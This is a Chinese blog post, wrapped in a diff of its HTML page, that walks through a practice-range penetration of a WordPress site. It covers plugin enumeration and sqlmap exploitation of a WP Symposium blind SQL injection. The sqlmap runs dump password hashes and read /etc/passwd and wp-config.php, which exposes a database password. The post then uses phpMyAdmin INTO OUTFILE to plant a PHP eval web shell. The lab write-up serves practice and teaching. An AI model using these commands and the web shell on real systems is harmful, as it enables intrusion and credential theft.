@@ -1,0 +1,620 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>记一次靶场渗透 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="记一次靶场渗透">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2017-09-10 13:43" pubdate>
+        2017年9月10日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      22
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">记一次靶场渗透</h1>
+            
+            <div class="markdown-body">
+              <p>找了个靶场练练手，在此记一下。</p>
+<a id="more"></a>
+
+<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>直接访问，是wordpress博客</p>
+<pre><code>Apache/2.4.10 (Debian)
+</code></pre>
+<p>使用御剑扫一下网站</p>
+<pre><code>http://218.2.197.234:2040/phpmyadmin/db_create.php
+http://218.2.197.234:2040/phpmyadmin/index.php
+http://218.2.197.234:2040/phpmyadmin/tbl_create.php
+http://218.2.197.234:2040/wp-admin/admin-ajax.php
+http://218.2.197.234:2040/wp-admin/install.php
+http://218.2.197.234:2040/wp-login.phphttp://218.2.197.234:2040/readme.html
+</code></pre>
+<p>看样子有phpmyadmin，既然是wordpress博客，那么就用WPScan扫一下，找到两个有问题的插件</p>
+<pre><code>root@kali:~# wpscan -u &quot;http://218.2.197.234:2040/&quot; --enumerate p
+
+[+] We found 2 plugins:
+
+[+] Name: akismet
+ |  Latest version: 3.3.4 
+ |  Location: http://218.2.197.234:2040/wp-content/plugins/akismet/
+
+[!] We could not determine a version so all vulnerabilities are printed out
+
+[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8215
+    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
+    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
+[i] Fixed in: 3.1.5
+
+[+] Name: wp-symposium - v15.1
+ |  Location: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/
+ |  Readme: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/readme.txt
+[!] The version is out of date, the latest version is 15.8.1
+</code></pre>
+<p>而且知道了wordpress的版本为v4.3.1<br>主题是</p>
+<pre><code>[+] Name: twentyfifteen - v1.3
+ |  Location: http://218.2.197.234:2040/wp-content/themes/twentyfifteen/
+ |  Readme: http://218.2.197.234:2040/wp-content/themes/twentyfifteen/readme.txt
+[!] The version is out of date, the latest version is 1.8
+ |  Style URL: http://218.2.197.234:2040/wp-content/themes/twentyfifteen/style.css
+ |  Theme Name: Twenty Fifteen
+ |  Theme URI: https://wordpress.org/themes/twentyfifteen/
+ |  Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen&#39;s simple,...
+ |  Author: the WordPress team
+ |  Author URI: https://wordpress.org/    
+</code></pre>
+<p>有个用户<br>​<br>​    [+] Enumerating usernames …<br>​    [+] Identified the following 1 user/s:<br>​        +—-+———–+———–+<br>​        | Id | Login     | Name      |<br>​        +—-+———–+———–+<br>​        | 1  | localhost | localhost |<br>​        +—-+———–+———–+</p>
+<p>已经知道了只有这一个Web服务，就没必要用Nmap扫描了。</p>
+<p>统计一下信息<br>​<br>​    Web容器 Apache/2.4.10 (Debian)<br>​    phpmyadmin<br>​<br>​    wordpress<br>​    有两个脆弱的插件 Akismet 和 wp-symposium - v15.1<br>​    主题是 twentyfifteen - v1.3<br>​    一个用户 localhost</p>
+<p>去网上寻找wp-symposium v15.1的漏洞</p>
+<p>找到三个，全部都是SQL注入</p>
+<pre><code>CVE-2015-3325
+WordPress Plugin WP Symposium 15.1 - &#39;&amp;show=&#39; SQL Injection
+https://www.exploit-db.com/exploits/37080/
+
+CVE-2015-6522
+WordPress Plugin WP Symposium 15.1 - &#39;get_album_item.php&#39; SQL Injection
+https://www.exploit-db.com/exploits/37824/
+
+WordPress Plugin WP Symposium 15.1 - Blind SQL Injection
+https://www.exploit-db.com/exploits/37822/
+</code></pre>
+<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>经过测试只有第三个可以注入成功，CVE-2015-6522在这个网站上没法查询别的数据，看源代码是没有过滤的，但是只能返回database(),version()等函数的值。</p>
+<p>利用第三个盲注漏洞，使用SQLmap</p>
+<p>将访问的请求包保存到txt文件里，使用-r参数</p>
+<p>跑数据库</p>
+<pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; --dbs
+</code></pre>
+<p>回显<br>​<br>​    available databases [4]:<br>​    [<em>] information_schema<br>​    [</em>] mysql<br>​    [<em>] performance_schema<br>​    [</em>] wordpress</p>
+<p>跑wordpress的表</p>
+<pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; -D &quot;wordpress&quot; --tables
+</code></pre>
+<p>回显</p>
+<pre><code>Database: wordpress             
+[36 tables]                     
++------------------------------+
+| wp_commentmeta               |
+| wp_comments                  |
+| wp_links                     |
+| wp_options                   |
+| wp_postmeta                  |
+| wp_posts                     |
+| wp_symposium_audit           |
+| wp_symposium_cats            |
+| wp_symposium_chat2           |
+| wp_symposium_chat2_typing    |
+| wp_symposium_chat2_users     |
+| wp_symposium_comments        |
+| wp_symposium_events          |
+| wp_symposium_events_bookings |
+| wp_symposium_extended        |
+| wp_symposium_following       |
+| wp_symposium_friends         |
+| wp_symposium_gallery         |
+| wp_symposium_gallery_items   |
+| wp_symposium_group_members   |
+| wp_symposium_groups          |
+| wp_symposium_likes           |
+| wp_symposium_lounge          |
+| wp_symposium_mail            |
+| wp_symposium_news            |
+| wp_symposium_styles          |
+| wp_symposium_subs            |
+| wp_symposium_topics          |
+| wp_symposium_topics_images   |
+| wp_symposium_topics_scores   |
+| wp_symposium_usermeta        |
+| wp_term_relationships        |
+| wp_term_taxonomy             |
+| wp_terms                     |
+| wp_usermeta                  |
+| wp_users                     |
++------------------------------+
+</code></pre>
+<p>看名称，用户名和密码应该在wp_users中，直接跑数据</p>
+<pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; -D &quot;wordpress&quot; -T &quot;wp_users&quot; --dump
+</code></pre>
+<p>回显</p>
+<pre><code>Database: wordpress
+Table: wp_users
+[1 entry]
++----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url | user_pass                          | user_login | user_email    | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | &lt;blank&gt;  | $P$BoRvgt/kaEDWqyiq0a3U8QjUQAO6gQ0 | localhost  | test@test.com | 0           | localhost    | localhost     | 2015-10-11 10:10:07 | &lt;blank&gt;             |
++----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+</code></pre>
+<p>很明显，密码是被加密过的，根据网上资料可知强度很高，很难破解。</p>
+<p>尝试从phpmyadmin入手，首先用SQLmap将数据库的用户名和密码跑出来</p>
+<pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; --current-user --password
+</code></pre>
+<p>回显</p>
+<pre><code>database management system users password hashes:
+[*] debian-sys-maint [1]:
+    password hash: *AA59232D46C9C0751BA3069045A0B90F3C6431C4
+[*] root [1]:
+    password hash: *74ACCF7FB15CDBAEE88B9E7F7B58352D3308CFF2
+[*] wordpress [1]:
+    password hash: *A22BD9F95BF505E792C556FC1EF9FCFA6B6B5D9B
+</code></pre>
+<p>很遗憾，同样是加密过的，很难破解。</p>
+<p>再换个方向，直接用sqlmap写Shell，但总是报错，看样子权限不够。没思路了。。</p>
+<p>于是请教了下表哥，读文件+扫目录。<br>尝试用sqlmap读了下/etc/passwd，可以读。看样子读文件是有权限的，但是由于是盲注，读数据很慢。渗透网站的话可以读一下网站的配置文件，但是不知道绝对路径。可以猜：</p>
+<pre><code>Apache默认的网站路径为 /var/www/html/
+wordpress在网站根目录存在wp-config.php的配置文件
+</code></pre>
+<p>尝试直接用sqlmap读取这个文件</p>
+<pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; --file-read &quot;/var/www/html/wp-config.php&quot; -p &quot;topic_id&quot;
+</code></pre>
+<p>运气不错，直接下载到本地了</p>
+<pre><code> &lt;?php
+define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);
+define(&#39;DB_USER&#39;, &#39;wordpress&#39;);
+define(&#39;DB_PASSWORD&#39;, &#39;CxfKVWX5@xr5cqzb8&#39;);
+define(&#39;DB_HOST&#39;, &#39;localhost&#39;);
+if ( !defined(&#39;ABSPATH&#39;) )
+    define(&#39;ABSPATH&#39;, dirname(__FILE__) . &#39;/&#39;);
+require_once(ABSPATH . &#39;wp-settings.php&#39;);
+</code></pre>
+<p>在这个文件里，我们可以获得wordpress用户的用户名和密码<br>​<br>​    Username: wordpress<br>​    Password: CxfKVWX5@xr5cqzb8</p>
+<p>然后进入phpmyadmin,直接登录</p>
+<pre><code>http://218.2.197.234:2040/phpmyadmin
+</code></pre>
+<p>在其中的SQL语句执行窗口执行SQL语句，直接往网站根目录写文件也是没有权限的，会报错</p>
+<pre><code>select &#39;&lt;?php @eval($_POST[2333])?&gt;&#39;INTO OUTFILE &#39;/var/www/html/123456789.php&#39;;
+
+#1 - Can&#39;t create/write to file &#39;/var/www/html/123456789.php&#39; (Errcode: 13)
+</code></pre>
+<p>尝试更换写文件的路径，首先用DirBuster扫了下目录，有images和upload两个文件夹，这种目录的权限一般会低一些。</p>
+<p><img src="https://image.mengsec.com/test-8-22-1.png" srcset="/img/loading.gif"></p>
+<p>尝试</p>
+<pre><code>select &#39;&lt;?php @eval($_POST[2333])?&gt;&#39;INTO OUTFILE &#39;/var/www/html/upload/123456789.php&#39;;
+select &#39;&lt;?php @eval($_POST[2333])?&gt;&#39;INTO OUTFILE &#39;/var/www/html/images/123456789.php&#39;;
+</code></pre>
+<p>成功在images中写入shell。</p>
+<p><img src="https://image.mengsec.com/test-8-22-2.png" srcset="/img/loading.gif"></p>
+<p>用菜刀连接，在网站目录下获得flag</p>
+<pre><code>flag&#123;Hi_Web_fLaG_Is_HEre&#125;   
+</code></pre>
+<p>PS: 如果已知flag在网站根目录的话，可以直接用sqlmap读取文件，不用拿Shell</p>
+<h2 id="0x02-收获-amp-感想"><a href="#0x02-收获-amp-感想" class="headerlink" title="0x02 收获&amp;感想"></a>0x02 收获&amp;感想</h2><ol>
+<li>渗透测试中信息收集真的很重要，一旦忽略了什么，在测试过程中就更容易卡住。</li>
+<li>在测试中要打开自己的思路，要思考全面。比如写文件不行的话，可以读文件嘛，说白了，还是经验不足，练得少。</li>
+<li>つ﹏⊂强行凑三条(逃</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/09/10/ourphp-v1-7-3-SQL-Injection/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Ourphp v1.7.3 SQL Injection</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
